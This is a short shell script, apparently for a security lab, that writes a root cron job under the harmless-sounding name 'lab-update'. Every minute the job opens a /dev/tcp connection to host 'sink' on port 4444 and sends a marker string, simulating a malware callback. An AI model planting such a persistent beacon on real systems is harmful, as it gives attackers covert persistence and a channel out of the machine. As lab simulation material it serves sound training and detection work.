#!/bin/sh
# A cron job that runs the callback stand-in (one connection to sink:4444) every minute.
# Runs as root inside a lab machine.
set -eu
echo "* * * * * root /bin/bash -c 'exec 3<>/dev/tcp/sink/4444 && echo lab-callback >&3'" > /etc/cron.d/lab-update
chmod 644 /etc/cron.d/lab-update
